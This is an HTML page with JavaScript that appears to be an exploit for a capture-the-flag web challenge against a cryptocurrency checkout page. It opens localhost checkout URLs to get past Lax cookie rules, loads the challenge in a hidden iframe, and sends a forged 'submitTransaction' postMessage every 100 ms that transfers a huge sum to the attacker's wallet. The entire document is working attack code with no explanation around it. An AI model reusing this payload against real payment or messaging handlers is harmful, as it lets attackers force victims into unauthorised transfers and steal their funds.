<!DOCTYPE html>
<html>
<body>
    <script>
        // Use the common internal ports found in CTF challenges
        const LOCAL_PORTS = [80, 8000, 8080];
        const MY_WALLET = '1f3d796f822b439dc366e4de68133f13c2';

        // We use a Top-Level Redirect to ensure Cookies are sent (Lax bypass)
        // We target 'localhost' as hinted in the trail
        function startHeist(port) {
            const internalURL = `http://localhost:${port}/checkout.html?currency=1337COIN&price=1`;
            
            // Create a temporary link and click it silently
            const a = document.createElement('a');
            a.href = internalURL;
            a.target = '_blank'; // Some bots allow 1 popup if it's "clicked"
            document.body.appendChild(a);
            a.click();

            // While the bot is on that page, we spam the postMessage
            // We use the challenge domain as a backup in case localhost isn't the direct host
            setInterval(() => {
                window.parent.postMessage({
                    type: 'submitTransaction',
                    transaction: {
                        currency: '1337COIN',
                        amount: 100000000,
                        toAddress: MY_WALLET
                    }
                }, '*');
            }, 100);
        }

        // Try the most likely ports
        LOCAL_PORTS.forEach(port => startHeist(port));

        // Backup: If the bot stays on OUR page, we iframe the challenge directly
        const backup = document.createElement('iframe');
        backup.src = 'https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1';
        backup.style.display = 'none';
        document.body.appendChild(backup);
    </script>
</body>
</html>
